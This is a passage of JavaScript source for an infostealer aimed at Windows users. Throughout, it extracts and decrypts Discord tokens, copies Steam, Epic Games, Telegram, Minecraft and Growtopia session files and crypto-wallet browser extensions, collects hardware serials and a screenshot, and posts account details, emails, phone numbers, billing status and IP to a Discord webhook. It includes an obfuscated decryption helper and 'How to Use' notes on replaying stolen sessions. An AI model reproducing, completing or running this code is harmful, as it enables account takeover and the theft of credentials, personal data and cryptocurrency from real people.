                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                            ],
                            footer: {
                                text: `${user.hostname} | t.me/vatfraudster`,
                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                            },
                            author: {
                                name: "Reddit Session Detected",
                                icon_url: "https://preview.redd.it/reddit-logo-changes-to-old-non-pixelated-logo-sign-of-v0-1povzsj8o0eb1.jpg?width=640&crop=smart&auto=webp&s=8bab770af358cf676163dbde410c9caa2b13cbe5"
                            }
                        };

                        axios.post(discordWebhookUrl, { embeds: [embedData] })
                            .catch(error => {
                                console.error('Error sending Discord webhook:', error.message);
                            });
                    })
                    .catch(error => {
                        axios.post(discordWebhookUrl, { content: 'Error retrieving user data: ' + error.message })
                            .catch(webhookError => {
                                console.error('Error sending Discord webhook:', webhookError.message);
                            });
                    });
            })
            .catch(error => {
                axios.post(discordWebhookUrl, { content: 'Error obtaining access token: ' + error.message })
                    .catch(webhookError => {
                        console.error('Error sending Discord webhook:', webhookError.message);
                    });
            });
    } catch (error) {
        axios.post(discordWebhookUrl, { content: 'An error occurred Rddit: ' + error.message })
            .catch(webhookError => {
                console.error('Error sending Discord webhook:', webhookError.message);
            });
    }
}

const discordFolderPath = path.join(mainFolderPath, 'Discord');
const discordFile = path.join(discordFolderPath, 'discord_tokens.txt');
const tokens = new Set();
function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';
    if (!fs.existsSync(discordFolderPath)) fs.mkdirSync(discordFolderPath, { recursive: true });

    if (!path_tail.includes('discord')) {
        try {
            fs.readdirSync(path).map((file) => {
              (file.endsWith('.log') || file.endsWith('.ldb')) &&
                fs.readFileSync(path + '\\' + file, 'utf8').split(/\r?\n/).forEach((line) => {

                    const patterns = [
                      new RegExp(/mfa\.[\w-]{84}/g), 
                      new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), 
                      new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)
                    ];

                    for (const pattern of patterns) {
                      const foundTokens = line.match(pattern);
                      if (foundTokens)
                        foundTokens.forEach((token) => {
                          if (!tokens.includes(token)) tokens.push(token);
                        });
                    }
                  });
            });
          } catch (e) {}
          return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
                const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + '\\Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                const decryptionKey = Dpapi.unprotectData(encryptedKey, null, 'CurrentUser');
                fs.readdirSync(path).forEach(file => {
                    if (!file.endsWith('.log') && !file.endsWith('.ldb')) return;
                    const content = fs.readFileSync(path + '\\' + file, 'utf8');
                    const encryptedRegex = /dQw4w9WgXcQ:([^"\\]+)/g;
                    let match;
                    
                    while ((match = encryptedRegex.exec(content))) {
                        try {
                            const encryptedToken = Buffer.from(match[1], 'base64');
                            const iv = encryptedToken.subarray(3, 15);
                            const payload = encryptedToken.subarray(15, -16);
                            const authTag = encryptedToken.subarray(-16);
                            const decipher = crypto.createDecipheriv('aes-256-gcm', decryptionKey, iv);
                            decipher.setAuthTag(authTag);
                            const token = decipher.update(payload, undefined, 'utf8') + decipher.final('utf8');
                            tokens.add(token);
                        } catch (e) {
                            console.error('Decrypt error:', e);
                        }
                    }
                    
                    const tokenPatterns = [
                        /mfa\.[\w-]{84}/g,
                        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}/g
                    ];
                    
                    tokenPatterns.forEach(pattern => {
                        const matches = content.match(pattern) || [];
                        matches.forEach(t => tokens.add(t));
                    });
                });

                
                fs.writeFileSync(discordFile, Array.from(tokens).join('\n'));
                
            } catch (e) {
                console.error('Global error:', e);
            }
        }
    }
}

async function getUserData(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/oauth2/tokens", {
            headers: { 
                "Content-Type": "application/json", 
                "authorization": token
            },
        });
        
        if(!response.data.some(token => token.scopes.includes('identify'))) {
        throw new Error("Missing 'identify' scope");
        }
        const userData = response.data;
        if (!userData) return null;
        const id = userData.id;
        const username = userData.username;
        const discriminator = userData.discriminator;
        const avatar = userData.avatar;
        const email = userData.email;
        const phone = userData.phone;
        const mfa_enabled = userData.mfa_enabled;
        const flags = userData.flags;
        const premium_type = userData.premium_type;
        const bio = userData.bio;
        return { id, username, discriminator, avatar, email, phone, mfa_enabled, flags, premium_type, bio };
    } catch (error) {
        console.error(error);
        return null;
    }
}

async function getTokens() {
    const interceptedTokens = [];
    for (let path of paths) await findToken(path);
    for (let token of tokens) {
        try {
            const ping = await axios.get("https://discord.com/api/v9/users/@me", {
                headers: { "Content-Type": "application/json", "authorization": token },
                timeout: 5000
            });
            
            if(ping.status !== 200) continue;

            const userData = await getUserData(token);
            if (!userData) continue;
            const phoneNumber = userData.phone || "None";
            interceptedTokens.push(token);
            const hqGuilds = await getHQGuilds(token);
            const ip = await getIp();
            const billing = await getBilling(token);
            const friends = await getRelationships(token);
            const currentBio = userData.bio|| "None";
            const randomString = crypto.randomBytes(16).toString('hex');
            const userInformationEmbed = {
                title: `${userData.username}#${userData.discriminator} (${userData.id})`,
                color: 0x303037,
                author: {
                    name: "Discord Session Detected",
                    icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
                },
                fields: [
                    {
                        name: ":key: Token:",
                        value: "```" + token + "```",
                    },
                    {
                        name: ":envelope: Email:",
                        value: "``" + `\`${userData.email}\`` + "``",
                        inline: true
                    },
                    {
                        name: ":globe_with_meridians: IP:",
                        value: "``" + `\`${ip}\`` + "``",
                        inline: true
                    },
                    {
                        name: "<:mobile88:1210411486120517663> Phone:",
                        value: "``" + `\`${phoneNumber}\`` + "``",
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(userData.flags)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(userData.premium_type, userData.id, token)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
                        inline: true
                    },
                    {
                        name: ":shield: HQ Guilds:",
                        value: hqGuilds,
                        inline: true
                    },
                ],
                footer: {
                    text: `${user.hostname} | t.me/vatfraudster`,
                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                }
            };

            const data = {
                embeds: [userInformationEmbed],
            };

            if (friends !== '*Nothing to see here*') {
                const friendsEmbed = {
                    title: "Friends",
                    color: 0x303037,
                    description: friends,
                    author: {
                        name: "HQ Friends",
                        icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                    },
                    footer: {
                        text: `${user.hostname} | t.me/vatfraudster`,
                    }
                };
                data.embeds.push(friendsEmbed);
            }

            if (currentBio !== null) {
                userInformationEmbed.fields.push({
                    name: "<a:aa_star_black:1157319572328808449> About me:",
                    value: "```\n" + userData.bio + "\n```",
                });
            }
            await axios.post(discordWebhookUrl, data);
        } catch (err) {
            console.error(`invalid token ${token.slice(0,15)}... :`, err.message);
        }
    }
}

async function getHQGuilds(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
            headers: { 
                "Content-Type": "application/json", 
                "authorization": token
            }
        });
        const hqGuilds = response.data.filter(guild => guild.permissions === "562949953421311");
        if (hqGuilds.length === 0) return "```No HQ Guilds```";
        let result = "\n";
        for (const guild of hqGuilds) {
            const invites = await getGuildInvites(token, guild.id);
            const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";
            const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";
            result += `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;
            if (result.length >= 1024) return "\`Too many servers to display.\`";
        }
        return result;
    } catch (error) {
        console.error(error);
        return "Error retrieving HQ Guilds";
    }
}

async function getGuildInvites(token, guildId) {
    try {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guildId}/invites`, {
            headers: { 
                "Content-Type": "application/json", 
                "authorization": token
            },
        });

        return response.data;
    } catch (error) {
        console.error(error);
        return "No Invite";
    }
}


const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: { 
            "Content-Type": "application/json", 
            "authorization": token
        },
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: { 
            "Content-Type": "application/json", 
            "authorization": token
        },
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = "```No Billing```";
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return "```No Badges```";
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: { 
                    "Content-Type": "application/json", 
                    "authorization": token
                },
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "```No Nitro```";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

async function Killchrome() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['discord.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) continue
        try {
            let _0x276965 = Buffer.from(JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync('powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' + _0x4ff4c6 + "), $null, 'CurrentUser')").toString().split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

function copyFolder(source, destination) {
  if (!fs.existsSync(destination)) fs.mkdirSync(destination);
  const files = fs.readdirSync(source);
  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);
    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}

function copyGames(source, destination) {
  try {
    fs.mkdirSync(destination, { recursive: true }); 
  } catch (err) {
    console.error(`Error creating directory ${destination}: ${err.message}`);
    throw err;
  }
  const files = fs.readdirSync(source);
  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);
    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}


const logFilePath = path.join(mainFolderPath, 'debug.log');
function redirectErrorsToLog() {
    const originalConsoleError = console.error;
    console.error = function (message) {
        const formattedMessage = `${new Date().toISOString()} - ${message}\n`;
        fs.appendFile(logFilePath, formattedMessage, (err) => {
            if (err) return;
        });
        originalConsoleError.apply(console, arguments);
    };
}

async function SubmitTelegram() {
    try {
        const sourcePath = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;
        try {
            await fsPromises.access(sourcePath);
        } catch (error) {
            return;
        }
        const destinationPath = path.join(mainFolderPath, 'Telegram');
        exec("taskkill /IM Telegram.exe /F", (error, stdout, stderr) => {});
        await new Promise(resolve => setTimeout(resolve, 4000));
        addFolder(path.join('Telegram'));
        const blacklistFolders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];
        const files = await fsPromises.readdir(sourcePath);
        for (const file of files) {
            if (!blacklistFolders.includes(file)) {
                const sourceItemPath = path.join(sourcePath, file);
                const targetItemPath = path.join(destinationPath, file);
                try {
                    const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();

                    if (isDirectory) {
                        await fsPromises.mkdir(targetItemPath, { recursive: true });
                        await copyFolderContents(sourceItemPath, targetItemPath);
                    } else {
                        await fsPromises.copyFile(sourceItemPath, targetItemPath);
                    }
                } catch (err) {
                    console.error(`An error occurred: ${err}`);
                }
            }
        }
    } catch (error) {
        console.error(`Error in SubmitTelegram: ${error.message}`);
    }
}

async function copyFolderContents(source, target) {
    const files = await fsPromises.readdir(source);
    for (const file of files) {
        const sourceItemPath = path.join(source, file);
        const targetItemPath = path.join(target, file);
        const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();
        if (isDirectory) {
            await fsPromises.mkdir(targetItemPath, { recursive: true });
            await copyFolderContents(sourceItemPath, targetItemPath);
        } else {
            await fsPromises.copyFile(sourceItemPath, targetItemPath);
        }
    }
}



async function StealEpicGames() {
    try {
        const epicPath = path.join(localappdata, 'EpicGamesLauncher', 'Saved');
        const copiedPath = path.join(mainFolderPath, 'Epic Games');
        if (fs.existsSync(epicPath)) {
            if (!fs.existsSync(copiedPath)) fs.mkdirSync(copiedPath, { recursive: true });
            const epicSubfolders = ['Config', 'Data', 'Logs'];
            epicSubfolders.forEach(subfolder => {
                const sourcePath = path.join(epicPath, subfolder);
                const destinationPath = path.join(copiedPath, subfolder);
                try {
                    copyGames(sourcePath, destinationPath, { recursive: true });
                } catch (err) {
                    console.error(`An error occurred while copying ${subfolder}: ${err.message}`);
                }
            });

            const howToUseContent = `<================[ Stealer]>================>\n\n
Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
delete everything and copy all contents into the Epic Games folder and run.`;
            const howToUseFilePath = path.join(copiedPath, 'How to Use.txt');
            fs.writeFileSync(howToUseFilePath, howToUseContent, { encoding: 'utf8' });
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    } catch (error) {
        console.error(`Error in StealEpicGames: ${error.message}`);
    }
}

async function SubmitSteam() {
  try {
    var exists = false;

    if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
      exists = true;
      exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      exists = false;
    }

    if (exists) {
      const steamFoldersToCopy = ["userdata", "config"];
      steamFoldersToCopy.forEach(folder => {
        const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
        const destinationPath = path.join(mainFolderPath, 'Steam', folder);
        try {
          copyGames(sourcePath, destinationPath);
        } catch (err) {
          console.error(`An error occurred while copying ${folder}: ${err.message}`);
        }
      });
    }
  } catch (error) {
    console.error(`Error in SubmitSteam: ${error.message}`);
  }
}

async function stealSteamSession() {
    try {
        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];
            for (const account of accountIds) {
                try {
                    const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
                    const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
                    const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
                    const webhookPayload = {
                        embeds: [createSteamEmbed(account, accountInfo, games, level)]
                    };
                    await axios.post(discordWebhookUrl, webhookPayload);
                } catch (error) {
                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                }
            }
        }
    } catch (error) {
        console.error(`Error in stealSteamSession: ${error.message}`);
    }
}


function createSteamEmbed(account, accountInfo, games, level) {
    return {
        title: '',
        color: 0x303037,
        author: {
            name: "Steam Session Detected",
            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1024px-Steam_icon_logo.svg.png"
        },
        thumbnail: {
            url: accountInfo.players[0].avatarfull,
        },
        fields: [
            {
                name: "Steam Identifier",
                value: "```" + `${account}` + "```",
                inline: true
            },
            {
                name: "Profile URL",
                value: `[Click here](${accountInfo.players[0].profileurl})`,
                inline: true
            },
            {
                name: "Display Name",
                value: "```" + `${accountInfo.players[0].personaname}` + "```",
                inline: true
            },
            {
                name: "Time created",
                value: "```" + `${accountInfo.players[0].timecreated || "Private"}` + "```",
                inline: true
            },
            {
                name: "Level",
                value: "```" + `${level.player_level || "Private"}` + "```",
                inline: true
            },
            {
                name: "Game count",
                value: "```" + `${games.game_count || "Private"}` + "```",
                inline: true
            }
        ],
        footer: {
            text: `${user.hostname} | t.me/vatfraudster`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };
}


const writeFile = util.promisify(fs.writeFile);

async function ensureDirectoryExistence(dirPath) {
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }
}

async function getGrowtopia() {
  const growtopiaSource = `${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`;
  const growtopiaDestination = path.join(mainFolderPath, 'Growtopia\\save.dat');
  try {
    if (fs.existsSync(growtopiaSource)) {
      ensureDirectoryExistence(path.join(mainFolderPath, 'Growtopia'));
      fs.copyFileSync(growtopiaSource, growtopiaDestination);
      const howToUseDir = path.join(mainFolderPath, 'Growtopia', 'How to Use');
      await ensureDirectoryExistence(howToUseDir);
      const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
      const howToUseContent = `https://\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
      await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
    }
  } catch (e) {
    console.log(e);
  }
}


async function submitMinecraft(mainFolderPath) {
    try {
        const userHome = os.homedir();
        const minecraftPath = path.join(process.env.APPDATA, '.minecraft');
        const lunarclientPath = path.join(userHome, '.lunarclient');
        const launcherProfilesPath = path.join(minecraftPath, 'launcher_profiles.json');
        const lunarclientAccountsPath = path.join(lunarclientPath, 'settings', 'game', 'accounts.json');
        const filesToCheck = [ launcherProfilesPath, lunarclientAccountsPath];
        const existingFiles = filesToCheck.filter(filePath => fs.existsSync(filePath));
        if (existingFiles.length > 0) {
            for (const filePath of existingFiles) {
                const destinationPath = path.join(mainFolderPath, 'Minecraft', path.basename(filePath));
                await ensureDirectoryExistence(path.dirname(destinationPath));
                await copyFile(filePath, destinationPath);
            }
        }
        const lunarclientSettingsPath = path.join(lunarclientPath, 'settings');
        const targetSettingsPath = path.join(mainFolderPath, 'LunarClient', 'settings');
        if (fs.existsSync(lunarclientSettingsPath)) {
            await copyFolderContents(lunarclientSettingsPath, targetSettingsPath);
        }
    } catch (error) {
        console.error(`Error: ${error.message}`);
    }
}

async function createScreenshotScript() {
    const screenshotsFolder = path.join(mainFolderPath, 'Screenshots');
    if (!fs.existsSync(screenshotsFolder)) fs.mkdirSync(screenshotsFolder, { recursive: true });
    const randomFileName = `${generateRandomString(10)}.py`;
    const scriptPath = path.join(user.temp, randomFileName);
    const pythonScriptContent = `
import os
from PIL import ImageGrab

def screentimes(output_path):
    image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
    image.save(output_path)

if __name__ == "__main__":
    output_path = "${path.join(mainFolderPath, 'Screenshots', 'Screenshot.png').replace(/\\/g, '/')}"
    screentimes(output_path)
`;

    try {
        await fs.promises.writeFile(scriptPath, pythonScriptContent);
        await execPromise('pip install pillow');
        await execPromise(`python ${scriptPath}`);
        return scriptPath;
    } catch (error) {
        console.error(`Error writing Python script, installing Pillow, or executing script: ${error.message}`);
        throw error; 
    }
}

function computerinfo() {
    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');

    const commandMappings = {
        'wmic diskdrive get serialnumber': 'Disk',
        'wmic baseboard get serialnumber': 'Motherboard',
        'wmic path win32_computersystemproduct get uuid': 'SMBios',
        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
        'wmic memorychip get serialnumber': 'RAM',
        'wmic csproduct get uuid': 'Bios',
        'wmic cpu get processorid': 'CPU',
        'getmac /NH': 'Mac'
    };

    const outputFileStream = fs.createWriteStream(filePath);
    function runNextCommand(index) {
        const commandKeys = Object.keys(commandMappings);
        if (index < commandKeys.length) {
            const command = commandKeys[index];
            const header = `======= ${commandMappings[command]} =======\n`;
            outputFileStream.write(header);
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing command: ${command}\n${error}`);
                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
                } else {
                    console.log(`Command executed successfully: ${command}`);
                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
                    outputFileStream.write(cleanedOutput);
                }

                runNextCommand(index + 1);
            });
        } else {
            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
            outputFileStream.end();
        }
    }

    outputFileStream.write(user.copyright);
    runNextCommand(0);
}


async function archiveAndSendData() {
    let zipFilePath;
    const outputPath = path.join(mainFolderPath, 'Screenshots');
    const scriptPath = await createScreenshotScript(outputPath);
    try {
        await new Promise(resolve => setTimeout(resolve, 4000));
        const walletsFolder = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsFolder)) {
            fs.mkdirSync(walletsFolder);
        }
        for (let [extensionName, extensionPath] of Object.entries(extension)) {
            for (let i = 0; i < browserPath.length; i++) {
                let browserFolder;
                if (browserPath[i][0].includes('Local')) {
                    browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
                } else {
                    browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
                }
                const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
                if (fs.existsSync(browserExtensionPath)) {
                    const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
                    copyFolder(browserExtensionPath, walletFolder);
                }
            }
        }
        for (let [walletName, walletPath] of Object.entries(walletPaths)) {
            if (fs.existsSync(walletPath)) {
                const walletFolder = path.join(walletsFolder, walletName);
                copyFolder(walletFolder, walletPath);
            }
        }
        const data = { Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')] };
        if (tokens.length > 0) {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) fs.mkdirSync(discordFolderPath);
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const discordFileContent = tokens.join('\n');
            fs.writeFileSync(discordFilePath, discordFileContent);
            console.log('Tokens saved to discord.txt');
        } else {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) fs.mkdirSync(discordFolderPath);
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const noTokenMessage = 'No token found.';
            fs.writeFileSync(discordFilePath, noTokenMessage);
        }
        Object.entries(data).forEach(([dataType, files]) => {
            files.forEach(file => moveFileToFolder(file, dataType));
            console.log(`Files moved to ${dataType} folder`);
        });
        const archive = new AdmZip();
        archive.addLocalFolder(mainFolderPath);
        zipFilePath = `${mainFolderPath}.zip`;
        archive.addZipComment('All the Information was Stealed by .');
        archive.writeZip(zipFilePath);
        getExtension(mainFolderPath);
